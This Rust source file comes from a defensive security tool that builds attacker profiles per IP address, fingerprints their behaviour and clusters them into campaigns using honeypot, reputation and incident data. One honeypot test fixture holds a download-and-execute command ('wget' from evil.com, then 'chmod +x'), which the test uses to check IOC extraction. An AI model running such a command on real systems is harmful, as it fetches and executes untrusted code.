//! Attacker Intelligence Consolidation.
//!
//! Builds unified per-IP attacker profiles by combining incidents, decisions,
//! honeypot sessions, IP reputation, GeoIP, AbuseIPDB, CrowdSec, mesh intel,
//! IOCs, and MITRE ATT&CK mappings. Includes behavioral DNA fingerprinting
//! and recurrence tracking.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::path::Path;

use chrono::{DateTime, Timelike, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use tracing::warn;

use innerwarden_core::entities::EntityType;
use innerwarden_core::event::Severity;
use innerwarden_core::incident::Incident;

use crate::abuseipdb::IpReputation;
use crate::decisions::DecisionEntry;
use crate::geoip::GeoInfo;
use crate::ioc;
use crate::mitre;
use crate::state_store::StateStore;

// ---------------------------------------------------------------------------
// Core profile structures
// ---------------------------------------------------------------------------

/// Unified attacker profile combining all intelligence sources.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackerProfile {
    pub ip: String,

    // ── Identity ──
    pub geo: Option<GeoIdentity>,
    pub abuseipdb_score: Option<u8>,
    pub crowdsec_listed: bool,
    pub is_tor: bool,

    // ── Timeline / Recurrence ──
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub visit_count: u32,
    pub visit_dates: Vec<String>, // YYYY-MM-DD, capped at MAX_VISIT_DATES
    pub total_days_active: u32,

    // ── Attack profile ──
    pub detectors_triggered: BTreeSet<String>,
    pub mitre_techniques: BTreeSet<String>,
    pub max_severity: String,
    pub total_incidents: u32,
    pub total_events: u32,

    // ── Decisions ──
    pub total_decisions: u32,
    pub total_blocks: u32,
    pub total_honeypot_diversions: u32,
    pub total_monitors: u32,

    // ── Honeypot intel ──
    pub honeypot_sessions: u32,
    pub credentials_attempted: Vec<(String, String)>, // (user, pass), capped
    pub commands_executed: Vec<String>,                // capped
    pub iocs: IocsCompact,

    // ── Behavioral DNA ──
    pub dna: AttackerDna,

    // ── Mesh intel ──
    pub mesh_peer_confirmations: u32,
    pub mesh_signals_received: u32,

    // ── Composite risk score ──
    pub risk_score: u8, // 0–100

    // ── Metadata ──
    pub profile_version: u8,
    pub updated_at: DateTime<Utc>,
}

/// Geographic identity data.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeoIdentity {
    pub country: String,
    pub country_code: String,
    pub city: String,
    pub isp: String,
    pub asn: String,
}

/// Compact IOC summary stored per attacker profile.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct IocsCompact {
    pub ips: Vec<String>,     // capped at 20
    pub domains: Vec<String>, // capped at 20
    pub urls: Vec<String>,    // capped at 20
    pub categories: Vec<String>,
}

/// Behavioral fingerprint for an attacker.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackerDna {
    /// SHA-256 hex hash of canonical behavioral features.
    pub hash: String,
    /// Activity distribution by hour (UTC), 0–255 per bucket.
    pub hour_distribution: [u8; 24],
    /// Top targeted usernames (up to 5).
    pub target_users: Vec<String>,
    /// Top targeted ports (up to 5).
    pub target_ports: Vec<u16>,
    /// Tool signatures from honeypot commands.
    pub tool_signatures: Vec<String>,
    /// Days between consecutive visits (up to 20 entries).
    pub inter_visit_intervals: Vec<f32>,
    /// "regular_scanner" | "opportunistic" | "targeted" | "unknown"
    pub pattern_class: String,
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const MAX_VISIT_DATES: usize = 90;
#[allow(dead_code)]
const MAX_CREDENTIALS: usize = 50;
#[allow(dead_code)]
const MAX_COMMANDS: usize = 100;
#[allow(dead_code)]
const MAX_IOCS_PER_TYPE: usize = 20;
const MAX_INTERVALS: usize = 20;
const PROFILE_VERSION: u8 = 1;

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Create a new empty profile for an IP.
pub fn new_profile(ip: &str, ts: DateTime<Utc>) -> AttackerProfile {
    AttackerProfile {
        ip: ip.to_string(),
        geo: None,
        abuseipdb_score: None,
        crowdsec_listed: false,
        is_tor: false,
        first_seen: ts,
        last_seen: ts,
        visit_count: 0,
        visit_dates: Vec::new(),
        total_days_active: 0,
        detectors_triggered: BTreeSet::new(),
        mitre_techniques: BTreeSet::new(),
        max_severity: "info".to_string(),
        total_incidents: 0,
        total_events: 0,
        total_decisions: 0,
        total_blocks: 0,
        total_honeypot_diversions: 0,
        total_monitors: 0,
        honeypot_sessions: 0,
        credentials_attempted: Vec::new(),
        commands_executed: Vec::new(),
        iocs: IocsCompact::default(),
        dna: AttackerDna {
            hash: String::new(),
            hour_distribution: [0; 24],
            target_users: Vec::new(),
            target_ports: Vec::new(),
            tool_signatures: Vec::new(),
            inter_visit_intervals: Vec::new(),
            pattern_class: "unknown".to_string(),
        },
        mesh_peer_confirmations: 0,
        mesh_signals_received: 0,
        risk_score: 0,
        profile_version: PROFILE_VERSION,
        updated_at: ts,
    }
}

/// Update profile from a new incident.
///
/// Called from the fast loop for each IP entity in the incident.
pub fn observe_incident(profile: &mut AttackerProfile, incident: &Incident) {
    let ts = incident.ts;

    // Timeline
    if ts < profile.first_seen {
        profile.first_seen = ts;
    }
    if ts > profile.last_seen {
        profile.last_seen = ts;
    }
    profile.total_incidents += 1;

    // Recurrence: track unique visit dates
    let date_str = ts.format("%Y-%m-%d").to_string();
    if !profile.visit_dates.contains(&date_str) {
        if profile.visit_dates.len() < MAX_VISIT_DATES {
            profile.visit_dates.push(date_str);
            profile.visit_dates.sort();
        }
        profile.visit_count = profile.visit_dates.len() as u32;
        profile.total_days_active = profile.visit_count;
    }

    // Hour distribution for DNA
    let hour = ts.hour() as usize;
    profile.dna.hour_distribution[hour] = profile.dna.hour_distribution[hour].saturating_add(1);

    // Detector + MITRE
    let detector = mitre::detector_from_incident_id(&incident.incident_id);
    profile.detectors_triggered.insert(detector.to_string());
    if let Some(mapping) = mitre::map_detector(detector) {
        profile
            .mitre_techniques
            .insert(format!("{} ({})", mapping.technique_id, mapping.technique_name));
    }

    // Severity (keep max)
    let sev_rank = severity_rank(&incident.severity);
    if sev_rank > severity_rank_str(&profile.max_severity) {
        profile.max_severity = format!("{:?}", incident.severity).to_lowercase();
    }

    // Targeted users from entities
    for entity in &incident.entities {
        if entity.r#type == EntityType::User
            && !profile.dna.target_users.contains(&entity.value)
            && profile.dna.target_users.len() < 5
        {
            profile.dna.target_users.push(entity.value.clone());
        }
    }

    profile.updated_at = Utc::now();
}

/// Update profile from an AI decision.
///
/// Called from the fast loop after a decision is logged.
pub fn observe_decision(profile: &mut AttackerProfile, decision: &DecisionEntry) {
    profile.total_decisions += 1;
    match decision.action_type.as_str() {
        "block_ip" => profile.total_blocks += 1,
        "honeypot" => profile.total_honeypot_diversions += 1,
        "monitor" | "monitor_ip" => profile.total_monitors += 1,
        _ => {}
    }
    profile.updated_at = Utc::now();
}

/// Update profile from a honeypot session.
///
/// `session` is a raw JSON value from honeypot JSONL with fields:
/// peer_ip, session_id, auth_attempts, shell_commands.
#[allow(dead_code)]
pub fn observe_honeypot(profile: &mut AttackerProfile, session: &serde_json::Value) {
    profile.honeypot_sessions += 1;

    // Auth attempts: [{username, password}, ...]
    if let Some(attempts) = session.get("auth_attempts").and_then(|a| a.as_array()) {
        for attempt in attempts {
            let user = attempt
                .get("username")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let pass = attempt
                .get("password")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if !user.is_empty() && profile.credentials_attempted.len() < MAX_CREDENTIALS {
                let pair = (user, pass);
                if !profile.credentials_attempted.contains(&pair) {
                    profile.credentials_attempted.push(pair);
                }
            }
        }
    }

    // Shell commands
    if let Some(commands) = session.get("shell_commands").and_then(|c| c.as_array()) {
        let cmd_strings: Vec<String> = commands
            .iter()
            .filter_map(|c| {
                c.get("command")
                    .and_then(|v| v.as_str())
                    .or_else(|| c.as_str())
                    .map(String::from)
            })
            .collect();

        for cmd in &cmd_strings {
            if profile.commands_executed.len() < MAX_COMMANDS
                && !profile.commands_executed.contains(cmd)
            {
                profile.commands_executed.push(cmd.clone());
            }
        }

        // Extract IOCs from commands
        let extracted = ioc::extract_from_commands(&cmd_strings);
        merge_iocs(&mut profile.iocs, &extracted);

        // Tool signatures from command categories
        for cat in &extracted.categories {
            if !profile.dna.tool_signatures.contains(cat) {
                profile.dna.tool_signatures.push(cat.clone());
            }
        }
    }

    profile.updated_at = Utc::now();
}

/// Enrich profile with external intel (GeoIP, AbuseIPDB, CrowdSec).
#[allow(dead_code)]
pub fn enrich_identity(
    profile: &mut AttackerProfile,
    geo: Option<&GeoInfo>,
    abuse: Option<&IpReputation>,
    crowdsec_listed: bool,
) {
    if let Some(g) = geo {
        profile.geo = Some(GeoIdentity {
            country: g.country.clone(),
            country_code: g.country_code.clone(),
            city: g.city.clone(),
            isp: g.isp.clone(),
            asn: g.asn.clone(),
        });
    }
    if let Some(a) = abuse {
        profile.abuseipdb_score = Some(a.confidence_score);
        profile.is_tor = a.is_tor;
        // Backfill country from AbuseIPDB if GeoIP unavailable
        if profile.geo.is_none() {
            if let Some(cc) = &a.country_code {
                profile.geo = Some(GeoIdentity {
                    country: String::new(),
                    country_code: cc.clone(),
                    city: String::new(),
                    isp: a.isp.clone().unwrap_or_default(),
                    asn: String::new(),
                });
            }
        }
    }
    profile.crowdsec_listed = crowdsec_listed;
    profile.updated_at = Utc::now();
}

/// Recompute the behavioral DNA hash from current profile data.
pub fn compute_dna(profile: &mut AttackerProfile) {
    // Compute inter-visit intervals from sorted visit_dates
    profile.dna.inter_visit_intervals.clear();
    if profile.visit_dates.len() >= 2 {
        let dates: Vec<chrono::NaiveDate> = profile
            .visit_dates
            .iter()
            .filter_map(|d| chrono::NaiveDate::parse_from_str(d, "%Y-%m-%d").ok())
            .collect();
        for i in 1..dates.len().min(MAX_INTERVALS + 1) {
            let delta = (dates[i] - dates[i - 1]).num_days() as f32;
            profile.dna.inter_visit_intervals.push(delta);
        }
    }

    // Classify recurrence pattern
    profile.dna.pattern_class = classify_pattern(
        &profile.dna.inter_visit_intervals,
        profile.visit_count,
        profile.detectors_triggered.len(),
    );

    // Canonical hash input (deterministic)
    let mut hasher = Sha256::new();

    // Detectors (already sorted via BTreeSet)
    for d in &profile.detectors_triggered {
        hasher.update(d.as_bytes());
        hasher.update(b"|");
    }
    hasher.update(b"##");

    // Hour distribution
    hasher.update(profile.dna.hour_distribution);
    hasher.update(b"##");

    // Target users (sorted)
    let mut users = profile.dna.target_users.clone();
    users.sort();
    for u in &users {
        hasher.update(u.as_bytes());
        hasher.update(b"|");
    }
    hasher.update(b"##");

    // Tool signatures (sorted)
    let mut tools = profile.dna.tool_signatures.clone();
    tools.sort();
    for t in &tools {
        hasher.update(t.as_bytes());
        hasher.update(b"|");
    }

    profile.dna.hash = format!("{:x}", hasher.finalize());
}

/// Compute composite risk score (0–100) from all profile factors.
pub fn compute_risk_score(profile: &mut AttackerProfile) {
    let mut score: u32 = 0;

    // Incident volume (max 30)
    score += (profile.total_incidents * 3).min(30);

    // AbuseIPDB reputation (max 20)
    if let Some(abuse) = profile.abuseipdb_score {
        score += (abuse as u32) / 5; // 100/5 = 20
    }

    // Recurrence (max 15)
    score += (profile.visit_count * 5).min(15);

    // Cross-detector diversity (max 15)
    score += (profile.detectors_triggered.len() as u32 * 5).min(15);

    // Severity (max 10)
    score += match profile.max_severity.as_str() {
        "critical" => 10,
        "high" => 7,
        "medium" => 4,
        "low" => 2,
        _ => 0,
    };

    // Honeypot engagement (max 10)
    if !profile.commands_executed.is_empty() {
        score += 5;
    }
    if !profile.iocs.is_empty() {
        score += 5;
    }

    // CrowdSec listed (+5)
    if profile.crowdsec_listed {
        score += 5;
    }

    // Tor exit node (+5)
    if profile.is_tor {
        score += 5;
    }

    profile.risk_score = score.min(100) as u8;
}

/// The consolidation tick: called from the slow loop every 5 minutes.
///
/// Recomputes DNA hashes and risk scores, trims stale profiles, persists
/// to redb and writes a JSON snapshot for the dashboard.
pub fn consolidation_tick(
    profiles: &mut HashMap<String, AttackerProfile>,
    store: &StateStore,
    data_dir: &Path,
) {
    // Recompute DNA and risk scores
    for profile in profiles.values_mut() {
        compute_dna(profile);
        compute_risk_score(profile);
    }

    // Persist to redb
    for (ip, profile) in profiles.iter() {
        match serde_json::to_value(profile) {
            Ok(val) => store.set_attacker_profile(ip, &val),
            Err(e) => warn!("failed to serialize attacker profile for {ip}: {e}"),
        }
    }

    // Write JSON snapshot for dashboard
    persist_snapshot(data_dir, profiles);

    // Detect campaigns and persist
    let campaigns = detect_campaigns(profiles);
    persist_campaigns(data_dir, &campaigns);
}

/// Write profiles as a sorted JSON array to `attacker-profiles.json`.
pub fn persist_snapshot(data_dir: &Path, profiles: &HashMap<String, AttackerProfile>) {
    let mut sorted: Vec<&AttackerProfile> = profiles.values().collect();
    sorted.sort_by(|a, b| b.risk_score.cmp(&a.risk_score));

    let path = data_dir.join("attacker-profiles.json");
    match serde_json::to_string(&sorted) {
        Ok(json) => {
            if let Err(e) = std::fs::write(&path, json) {
                warn!("failed to write attacker-profiles.json: {e}");
            }
        }
        Err(e) => warn!("failed to serialize attacker profiles: {e}"),
    }
}

/// Load profiles from redb on startup.
pub fn load_from_store(store: &StateStore) -> HashMap<String, AttackerProfile> {
    let mut profiles = HashMap::new();
    for (ip, val) in store.all_attacker_profiles() {
        match serde_json::from_value(val) {
            Ok(profile) => {
                profiles.insert(ip, profile);
            }
            Err(e) => warn!("failed to deserialize attacker profile: {e}"),
        }
    }
    profiles
}

// ---------------------------------------------------------------------------
// Internals
// ---------------------------------------------------------------------------

/// Classify recurrence pattern from inter-visit intervals.
fn classify_pattern(intervals: &[f32], visit_count: u32, detector_count: usize) -> String {
    if visit_count < 2 || intervals.is_empty() {
        return "unknown".to_string();
    }

    let mean = intervals.iter().sum::<f32>() / intervals.len() as f32;
    let variance =
        intervals.iter().map(|v| (v - mean).powi(2)).sum::<f32>() / intervals.len() as f32;
    let stddev = variance.sqrt();

    if stddev < 2.0 && visit_count >= 3 {
        "regular_scanner".to_string()
    } else if visit_count >= 5 && detector_count > 3 {
        "targeted".to_string()
    } else {
        "opportunistic".to_string()
    }
}

fn severity_rank(s: &Severity) -> u8 {
    match s {
        Severity::Debug => 0,
        Severity::Info => 1,
        Severity::Low => 2,
        Severity::Medium => 3,
        Severity::High => 4,
        Severity::Critical => 5,
    }
}

fn severity_rank_str(s: &str) -> u8 {
    match s {
        "critical" => 5,
        "high" => 4,
        "medium" => 3,
        "low" => 2,
        "info" => 1,
        _ => 0,
    }
}

#[allow(dead_code)]
fn merge_iocs(target: &mut IocsCompact, source: &ioc::ExtractedIocs) {
    for ip in &source.ips {
        if target.ips.len() < MAX_IOCS_PER_TYPE && !target.ips.contains(ip) {
            target.ips.push(ip.clone());
        }
    }
    for domain in &source.domains {
        if target.domains.len() < MAX_IOCS_PER_TYPE && !target.domains.contains(domain) {
            target.domains.push(domain.clone());
        }
    }
    for url in &source.urls {
        if target.urls.len() < MAX_IOCS_PER_TYPE && !target.urls.contains(url) {
            target.urls.push(url.clone());
        }
    }
    for cat in &source.categories {
        if !target.categories.contains(cat) {
            target.categories.push(cat.clone());
        }
    }
}

impl IocsCompact {
    pub fn is_empty(&self) -> bool {
        self.ips.is_empty() && self.domains.is_empty() && self.urls.is_empty()
    }
}

// ---------------------------------------------------------------------------
// Campaign intelligence — DNA + IOC correlation
// ---------------------------------------------------------------------------

/// A behavioral signature for clustering (softer than the full DNA hash).
/// Two attackers with the same BehavioralSignature are likely the same actor
/// or part of the same campaign, even from different IPs.
fn behavioral_signature(profile: &AttackerProfile) -> String {
    let mut hasher = Sha256::new();
    // Detectors (sorted via BTreeSet)
    for d in &profile.detectors_triggered {
        hasher.update(d.as_bytes());
        hasher.update(b"|");
    }
    hasher.update(b"##");
    // Tool signatures (sorted)
    let mut tools = profile.dna.tool_signatures.clone();
    tools.sort();
    for t in &tools {
        hasher.update(t.as_bytes());
        hasher.update(b"|");
    }
    hasher.update(b"##");
    // Target users (sorted, top 3)
    let mut users = profile.dna.target_users.clone();
    users.sort();
    for u in users.iter().take(3) {
        hasher.update(u.as_bytes());
        hasher.update(b"|");
    }
    format!("{:x}", hasher.finalize())
}

/// A detected campaign linking multiple IPs by behavior and/or IOCs.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CampaignCluster {
    /// Unique campaign identifier (e.g., "CAMP-001").
    pub campaign_id: String,
    /// Member IPs in this campaign.
    pub member_ips: Vec<String>,
    /// How were they linked.
    pub correlation_type: String, // "dna" | "ioc" | "dna+ioc"
    /// Shared behavioral signature hash (first 12 chars).
    pub shared_dna_signature: String,
    /// Shared IOC indicators (C2 servers, malware URLs, domains).
    pub shared_iocs: Vec<String>,
    /// Shared detectors across all members.
    pub shared_detectors: Vec<String>,
    /// Combined risk score (max of members).
    pub max_risk_score: u8,
    /// Total incidents across all members.
    pub total_incidents: u32,
    /// Total unique visit days across all members.
    pub total_days_active: u32,
    /// Countries involved.
    pub countries: Vec<String>,
    /// Campaign confidence: "high" | "medium" | "low".
    pub confidence: String,
    /// Headline summary.
    pub summary: String,
}

/// Detect campaigns by correlating attackers via behavioral DNA and shared IOCs.
///
/// Returns campaigns sorted by max_risk_score descending.
pub fn detect_campaigns(profiles: &HashMap<String, AttackerProfile>) -> Vec<CampaignCluster> {
    if profiles.len() < 2 {
        return Vec::new();
    }

    let active: Vec<&AttackerProfile> = profiles
        .values()
        .filter(|p| p.total_incidents > 0)
        .collect();
    if active.len() < 2 {
        return Vec::new();
    }

    let n = active.len().min(500);

    // Union-Find
    let mut parent: Vec<usize> = (0..n).collect();
    fn find(parent: &mut [usize], x: usize) -> usize {
        if parent[x] != x {
            parent[x] = find(parent, parent[x]);
        }
        parent[x]
    }
    fn union(parent: &mut [usize], a: usize, b: usize) {
        let ra = find(parent, a);
        let rb = find(parent, b);
        if ra != rb {
            parent[ra] = rb;
        }
    }

    // Track link reasons per pair
    let mut link_reasons: HashMap<(usize, usize), Vec<String>> = HashMap::new();

    // Phase 1: DNA signature clustering
    let signatures: Vec<String> = active.iter().take(n).map(|p| behavioral_signature(p)).collect();
    for i in 0..n {
        for j in (i + 1)..n {
            if signatures[i] == signatures[j] {
                union(&mut parent, i, j);
                let key = (i.min(j), i.max(j));
                link_reasons
                    .entry(key)
                    .or_default()
                    .push(format!("dna:{}", &signatures[i][..12]));
            }
        }
    }

    // Phase 2: Shared IOCs (C2 servers, malware URLs, domains)
    for i in 0..n {
        for j in (i + 1)..n {
            let a = active[i];
            let b = active[j];
            let mut shared = Vec::new();

            for url in &a.iocs.urls {
                if b.iocs.urls.contains(url) {
                    shared.push(format!("url:{url}"));
                }
            }
            for ip in &a.iocs.ips {
                if b.iocs.ips.contains(ip) {
                    shared.push(format!("c2:{ip}"));
                }
            }
            for domain in &a.iocs.domains {
                if b.iocs.domains.contains(domain) {
                    shared.push(format!("domain:{domain}"));
                }
            }

            if !shared.is_empty() {
                union(&mut parent, i, j);
                let key = (i.min(j), i.max(j));
                link_reasons.entry(key).or_default().extend(shared);
            }
        }
    }

    // Phase 3: Shared detectors (≥2 detectors = likely coordinated)
    for i in 0..n {
        for j in (i + 1)..n {
            let overlap: Vec<String> = active[i]
                .detectors_triggered
                .intersection(&active[j].detectors_triggered)
                .cloned()
                .collect();
            if overlap.len() >= 3 {
                // Only link by 3+ detectors (stricter than campaign detection)
                let already_linked = find(&mut parent, i) == find(&mut parent, j);
                if !already_linked {
                    union(&mut parent, i, j);
                }
                let key = (i.min(j), i.max(j));
                link_reasons
                    .entry(key)
                    .or_default()
                    .extend(overlap.iter().map(|d| format!("detector:{d}")));
            }
        }
    }

    // Collect components
    let mut components: HashMap<usize, Vec<usize>> = HashMap::new();
    for i in 0..n {
        let root = find(&mut parent, i);
        components.entry(root).or_default().push(i);
    }

    let mut campaigns = Vec::new();
    let mut camp_id = 0;

    for members in components.values() {
        if members.len() < 2 {
            continue;
        }
        camp_id += 1;

        let member_profiles: Vec<&AttackerProfile> = members.iter().map(|&i| active[i]).collect();
        let ips: Vec<String> = member_profiles.iter().map(|p| p.ip.clone()).collect();

        // Collect all link reasons
        let mut all_reasons: HashSet<String> = HashSet::new();
        for &i in members {
            for &j in members {
                if j > i {
                    if let Some(reasons) = link_reasons.get(&(i.min(j), i.max(j))) {
                        all_reasons.extend(reasons.iter().cloned());
                    }
                }
            }
        }

        let has_dna = all_reasons.iter().any(|r| r.starts_with("dna:"));
        let has_ioc = all_reasons
            .iter()
            .any(|r| r.starts_with("url:") || r.starts_with("c2:") || r.starts_with("domain:"));
        let correlation_type = match (has_dna, has_ioc) {
            (true, true) => "dna+ioc",
            (true, false) => "dna",
            (false, true) => "ioc",
            (false, false) => "detector",
        };

        let confidence = match (has_dna, has_ioc) {
            (true, true) => "high",
            (_, true) => "high",
            (true, _) => "medium",
            _ => "low",
        };

        // Shared DNA signature
        let shared_sig = all_reasons
            .iter()
            .find(|r| r.starts_with("dna:"))
            .map(|r| r.strip_prefix("dna:").unwrap_or("").to_string())
            .unwrap_or_default();

        // Shared IOCs
        let shared_iocs: Vec<String> = all_reasons
            .iter()
            .filter(|r| {
                r.starts_with("url:") || r.starts_with("c2:") || r.starts_with("domain:")
            })
            .cloned()
            .collect();

        // Shared detectors
        let shared_detectors: Vec<String> = all_reasons
            .iter()
            .filter(|r| r.starts_with("detector:"))
            .map(|r| r.strip_prefix("detector:").unwrap_or("").to_string())
            .collect();

        let max_risk = member_profiles.iter().map(|p| p.risk_score).max().unwrap_or(0);
        let total_inc: u32 = member_profiles.iter().map(|p| p.total_incidents).sum();
        let total_days: u32 = member_profiles.iter().map(|p| p.total_days_active).sum();

        let countries: Vec<String> = member_profiles
            .iter()
            .filter_map(|p| p.geo.as_ref().map(|g| g.country_code.clone()))
            .collect::<HashSet<_>>()
            .into_iter()
            .collect();

        // Generate summary
        let summary = format!(
            "{} IPs with {} behavior from {} countries — {} total incidents",
            ips.len(),
            if has_dna { "identical" } else { "related" },
            if countries.is_empty() {
                "unknown".to_string()
            } else {
                countries.join(", ")
            },
            total_inc
        );

        campaigns.push(CampaignCluster {
            campaign_id: format!("CAMP-{camp_id:03}"),
            member_ips: ips,
            correlation_type: correlation_type.to_string(),
            shared_dna_signature: shared_sig,
            shared_iocs,
            shared_detectors,
            max_risk_score: max_risk,
            total_incidents: total_inc,
            total_days_active: total_days,
            countries,
            confidence: confidence.to_string(),
            summary,
        });
    }

    campaigns.sort_by(|a, b| {
        b.max_risk_score
            .cmp(&a.max_risk_score)
            .then_with(|| b.member_ips.len().cmp(&a.member_ips.len()))
    });
    campaigns
}

/// Persist campaign clusters to `campaigns.json` for dashboard.
pub fn persist_campaigns(data_dir: &Path, campaigns: &[CampaignCluster]) {
    let path = data_dir.join("campaigns.json");
    match serde_json::to_string(campaigns) {
        Ok(json) => {
            if let Err(e) = std::fs::write(&path, json) {
                warn!("failed to write campaigns.json: {e}");
            }
        }
        Err(e) => warn!("failed to serialize campaigns: {e}"),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use innerwarden_core::entities::EntityRef;

    fn make_incident(detector: &str, severity: Severity, ip: &str) -> Incident {
        Incident {
            ts: Utc::now(),
            host: "test-host".into(),
            incident_id: format!("{detector}:{ip}:2026-03-29"),
            severity,
            title: format!("{detector} from {ip}"),
            summary: String::new(),
            evidence: serde_json::json!({}),
            recommended_checks: vec![],
            tags: vec![],
            entities: vec![EntityRef::ip(ip)],
        }
    }

    #[test]
    fn new_profile_defaults() {
        let p = new_profile("1.2.3.4", Utc::now());
        assert_eq!(p.ip, "1.2.3.4");
        assert_eq!(p.risk_score, 0);
        assert_eq!(p.visit_count, 0);
        assert_eq!(p.dna.pattern_class, "unknown");
    }

    #[test]
    fn observe_incident_updates_profile() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        let inc = make_incident("ssh_bruteforce", Severity::High, "10.0.0.1");
        observe_incident(&mut p, &inc);

        assert_eq!(p.total_incidents, 1);
        assert!(p.detectors_triggered.contains("ssh_bruteforce"));
        assert_eq!(p.max_severity, "high");
        assert_eq!(p.visit_count, 1);
    }

    #[test]
    fn observe_decision_counts_blocks() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        let dec = DecisionEntry {
            ts: Utc::now(),
            incident_id: "ssh_bruteforce:10.0.0.1:2026-03-29".into(),
            host: "test".into(),
            ai_provider: "test".into(),
            action_type: "block_ip".into(),
            target_ip: Some("10.0.0.1".into()),
            target_user: None,
            skill_id: Some("block-ip-xdp".into()),
            confidence: 0.95,
            auto_executed: true,
            dry_run: false,
            reason: "test".into(),
            estimated_threat: "high".into(),
            execution_result: "ok".into(),
            prev_hash: None,
        };
        observe_decision(&mut p, &dec);

        assert_eq!(p.total_decisions, 1);
        assert_eq!(p.total_blocks, 1);
    }

    #[test]
    fn observe_honeypot_extracts_data() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        let session = serde_json::json!({
            "peer_ip": "10.0.0.1",
            "session_id": "sess-001",
            "auth_attempts": [
                {"username": "root", "password": "admin123"},
                {"username": "admin", "password": "password"}
            ],
            "shell_commands": [
                {"command": "wget http://evil.com/shell.sh"},
                {"command": "chmod +x shell.sh"}
            ]
        });
        observe_honeypot(&mut p, &session);

        assert_eq!(p.honeypot_sessions, 1);
        assert_eq!(p.credentials_attempted.len(), 2);
        assert_eq!(p.commands_executed.len(), 2);
        assert!(!p.iocs.urls.is_empty());
        assert!(p.dna.tool_signatures.contains(&"download".to_string()));
        assert!(p.dna.tool_signatures.contains(&"execution".to_string()));
    }

    #[test]
    fn risk_score_calculation() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        // 10 incidents × 3 = 30 (capped at 30)
        p.total_incidents = 10;
        // AbuseIPDB 80/100 → 80/5 = 16
        p.abuseipdb_score = Some(80);
        // 3 visit days → 3×5 = 15
        p.visit_count = 3;
        // 2 detectors → 2×5 = 10
        p.detectors_triggered
            .insert("ssh_bruteforce".to_string());
        p.detectors_triggered
            .insert("credential_stuffing".to_string());
        // severity high → 7
        p.max_severity = "high".to_string();
        // honeypot commands → +5
        p.commands_executed.push("ls".to_string());
        // CrowdSec → +5
        p.crowdsec_listed = true;

        compute_risk_score(&mut p);
        // 30 + 16 + 15 + 10 + 7 + 5 + 5 = 88
        assert_eq!(p.risk_score, 88);
    }

    #[test]
    fn dna_hash_is_deterministic() {
        let mut p1 = new_profile("10.0.0.1", Utc::now());
        p1.detectors_triggered.insert("ssh_bruteforce".into());
        p1.dna.hour_distribution[14] = 5;
        p1.dna.target_users.push("root".into());
        p1.dna.tool_signatures.push("download".into());

        let mut p2 = p1.clone();

        compute_dna(&mut p1);
        compute_dna(&mut p2);

        assert!(!p1.dna.hash.is_empty());
        assert_eq!(p1.dna.hash, p2.dna.hash);
    }

    #[test]
    fn classify_regular_scanner() {
        // Consistent 1-day intervals, 4 visits
        let result = classify_pattern(&[1.0, 1.0, 1.0], 4, 1);
        assert_eq!(result, "regular_scanner");
    }

    #[test]
    fn classify_targeted() {
        // 5+ visits, 4 detectors, irregular
        let result = classify_pattern(&[1.0, 3.0, 7.0, 2.0], 5, 4);
        assert_eq!(result, "targeted");
    }

    #[test]
    fn classify_opportunistic() {
        let result = classify_pattern(&[15.0], 2, 1);
        assert_eq!(result, "opportunistic");
    }

    #[test]
    fn classify_unknown_insufficient_data() {
        let result = classify_pattern(&[], 1, 1);
        assert_eq!(result, "unknown");
    }

    #[test]
    fn enrich_identity_from_geoip() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        let geo = GeoInfo {
            country: "Brazil".into(),
            country_code: "BR".into(),
            city: "São Paulo".into(),
            isp: "Vivo".into(),
            asn: "AS28573".into(),
        };
        enrich_identity(&mut p, Some(&geo), None, false);
        assert_eq!(p.geo.as_ref().unwrap().country_code, "BR");
    }

    #[test]
    fn severity_upgrade() {
        let mut p = new_profile("10.0.0.1", Utc::now());
        let inc1 = make_incident("port_scan", Severity::Low, "10.0.0.1");
        observe_incident(&mut p, &inc1);
        assert_eq!(p.max_severity, "low");

        let inc2 = make_incident("ssh_bruteforce", Severity::Critical, "10.0.0.1");
        observe_incident(&mut p, &inc2);
        assert_eq!(p.max_severity, "critical");
    }

    #[test]
    fn merge_iocs_caps() {
        let mut compact = IocsCompact::default();
        for i in 0..25 {
            let source = ioc::ExtractedIocs {
                ips: vec![format!("1.2.3.{i}")],
                domains: vec![],
                urls: vec![],
                categories: vec![],
            };
            merge_iocs(&mut compact, &source);
        }
        assert_eq!(compact.ips.len(), MAX_IOCS_PER_TYPE);
    }

    // ── Campaign detection tests ──

    #[test]
    fn detect_campaigns_by_dna_signature() {
        let mut profiles = HashMap::new();
        // Two IPs with identical detectors + tools = same DNA signature
        let mut p1 = new_profile("1.1.1.1", Utc::now());
        p1.total_incidents = 5;
        p1.detectors_triggered.insert("ssh_bruteforce".into());
        p1.detectors_triggered.insert("credential_stuffing".into());
        p1.dna.tool_signatures.push("download".into());

        let mut p2 = new_profile("2.2.2.2", Utc::now());
        p2.total_incidents = 3;
        p2.detectors_triggered.insert("ssh_bruteforce".into());
        p2.detectors_triggered.insert("credential_stuffing".into());
        p2.dna.tool_signatures.push("download".into());

        // Different profile — should NOT be in the campaign
        let mut p3 = new_profile("3.3.3.3", Utc::now());
        p3.total_incidents = 1;
        p3.detectors_triggered.insert("web_scan".into());

        profiles.insert("1.1.1.1".into(), p1);
        profiles.insert("2.2.2.2".into(), p2);
        profiles.insert("3.3.3.3".into(), p3);

        let campaigns = detect_campaigns(&profiles);
        assert_eq!(campaigns.len(), 1);
        assert_eq!(campaigns[0].member_ips.len(), 2);
        assert!(campaigns[0].correlation_type.contains("dna"));
    }

